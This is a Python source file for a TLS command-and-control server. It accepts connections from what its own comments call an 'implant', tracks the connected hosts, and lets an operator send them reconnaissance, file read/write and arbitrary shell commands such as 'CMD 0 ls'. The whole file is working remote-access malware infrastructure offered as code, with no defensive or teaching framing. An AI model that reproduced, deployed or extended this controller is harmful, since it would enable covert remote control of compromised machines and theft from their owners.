# server.py (command‑first syntax: HELO 0 | RECON 0 | CMD 0 ls)
import socket
import ssl
import random
import threading

host = '0.0.0.0'  # Open to anyone on the same wifi
port = 8888

types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON']

lock = threading.Lock()
addresses = []

# ----------------------------------------------------------------------
# Server‑local helpers
# ----------------------------------------------------------------------
def list_connections():
    with lock:
        if not addresses:
            print("No connections yet.")
            return
        print("List of connections:")
        for idx, (addr, _) in enumerate(addresses):
            print(f"\t[{idx}]: {addr}")

def show_help():
    print("Usage: <command> <connection_id> [params...]")
    print("Server commands (no ID): 'help', 'listconns'")
    print("Client commands: HELO, EXIT, CMD <cmd>, RECON")
    print("Examples: HELO 0")
    print("          RECON 0")
    print("          CMD 0 ls")

# ----------------------------------------------------------------------
# Command input thread
# ----------------------------------------------------------------------
def parseAndSendInput():
    while True:
        try:
            raw = input('> ')
            user_input = raw.split()
            if not user_input:
                continue

            command = user_input[0]

            # ---- server‑local commands (no ID) ----
            if command == 'listconns':
                list_connections()
                continue
            if command == 'help':
                show_help()
                continue

            # ---- client commands require at least an index ----
            if len(user_input) < 2:
                print("Error: missing connection index. Use '<command> <id>'")
                show_help()
                continue

            index_str = user_input[1]
            try:
                idx = int(index_str)
            except ValueError:
                print(f"Invalid connection index '{index_str}'. Use an integer.")
                continue

            with lock:
                if idx >= len(addresses):
                    print(f"No connection at index {idx}")
                    continue
                addr, conn = addresses[idx]

            msg_type = command.upper()
            if msg_type not in types:
                print(f"Unknown command type: {msg_type}")
                show_help()
                continue

            # Build message
            msg_id = str(random.randint(0, 10**9))
            data = " ".join(user_input[2:]) if len(user_input) > 2 else ""

            if msg_type in ['READ', 'RITE', 'CMD'] and not data:
                print(f"{msg_type} requires additional arguments")
                continue
            if msg_type not in ['READ', 'RITE', 'CMD'] and data:
                print(f"{msg_type} should not have arguments")
                continue

            payload = "  ".join([msg_type, msg_id, data]).encode()
            with lock:
                conn.send(payload)

        except Exception as e:
            print(f"Something went wrong: {e}")
            show_help()

# ----------------------------------------------------------------------
# Message receiving thread (prints replies from implant)
# ----------------------------------------------------------------------
def receiveMessage(c: ssl.SSLSocket):
    while True:
        try:
            data = c.recv(1024)
            if not data:
                print("Disconnected")
                break
            response = data.decode().replace('\\n', '\n')
            print(f"Received: {response}")
        except Exception as e:
            print(f"[!] Error decoding response: {e}")
            break

# ----------------------------------------------------------------------
# Main server setup
# ----------------------------------------------------------------------
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
    raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_socket.bind((host, port))
    raw_socket.listen()
    print(f"Listening on {host}:{port} (TLS)")

    with ssl_context.wrap_socket(raw_socket, server_side=True) as s:
        # Start the interactive command thread (no args)
        threading.Thread(target=parseAndSendInput, daemon=True).start()

        while True:
            c, a = s.accept()
            print(f"Connected to {a}")
            with lock:
                addresses.append((a, c))
            threading.Thread(target=receiveMessage, args=(c,), daemon=True).start()
